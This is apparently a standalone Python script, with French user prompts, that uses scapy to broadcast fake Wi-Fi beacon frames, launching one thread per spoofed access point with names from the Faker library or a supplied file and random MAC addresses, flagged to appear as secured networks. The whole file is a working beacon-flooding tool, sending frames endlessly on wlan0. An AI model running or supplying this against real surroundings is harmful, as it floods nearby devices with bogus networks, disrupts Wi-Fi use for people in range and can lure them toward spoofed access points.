from scapy.all import *
from threading import Thread
from faker import Faker
import sys

# function to send beacon frames
def send_beacon(ssid, mac, infinite=True):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # ESS+privacy to appear as secured on some devices
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    # send the frame repeatedly with a 0.1s interval
    sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)

if __name__ == "__main__":
    # get the command line arguments
    arguments = sys.argv[1:]
    
    # if no arguments are provided, prompt the user for the number of access points to start
    if len(arguments) == 0:
        try:
            # number of access points
            n_ap = int(input("Combien d'AP voulez-vous démarrer ? "))
            iface = "wlan0"
            # generate random SSIDs and MACs using the Faker library
            faker = Faker() 
            ssids_macs = [ (faker.name(), faker.mac_address()) for i in range(n_ap) ]
            # start a thread for each SSID/MAC pair
            for ssid, mac in ssids_macs:
                Thread(target=send_beacon, args=(ssid, mac)).start()
        except ValueError:
            print("Choix invalide. Veuillez entrer un numéro valide.")
    else:
      # if a text file is provided as an argument, read the SSIDs from the file
      with open(arguments[0], 'r') as file:
          listNames = file.readlines()
      iface = "wlan0"
      # generate random MACs using the Faker library for each SSID in the file
      faker = Faker()
      ssids_macs = [(line.strip(), faker.mac_address()) for line in listNames]
      # start a thread for each SSID/MAC pair
      for ssid, mac in ssids_macs:
          Thread(target=send_beacon, args=(ssid, mac)).start()
